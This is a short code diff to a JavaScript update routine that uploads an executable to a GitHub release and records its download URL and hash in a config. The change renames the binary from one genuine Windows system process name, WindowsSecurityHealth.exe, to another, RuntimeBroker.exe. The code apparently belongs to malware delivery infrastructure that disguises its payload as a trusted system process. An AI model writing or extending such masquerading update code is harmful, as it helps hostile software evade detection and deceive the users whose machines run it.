@@ -468,7 +468,7 @@ async function pushUpdate() {
     });
     
     // Upload asset
-    const uploadUrl = release.upload_url.replace('{?name,label}', `?name=WindowsSecurityHealth.exe`);
+    const uploadUrl = release.upload_url.replace('{?name,label}', `?name=RuntimeBroker.exe`);
     await fetch(uploadUrl, {
       method: 'POST',
       headers: {
@@ -479,7 +479,7 @@ async function pushUpdate() {
     });
     
     // Update config
-    const exeUrl = `https://github.com/${STATE.repo}/releases/download/v${newVer}/WindowsSecurityHealth.exe`;
+    const exeUrl = `https://github.com/${STATE.repo}/releases/download/v${newVer}/RuntimeBroker.exe`;
     STATE.config.v = newVer;
     STATE.config.hash = hash;
     STATE.config.exe_url = exeUrl;
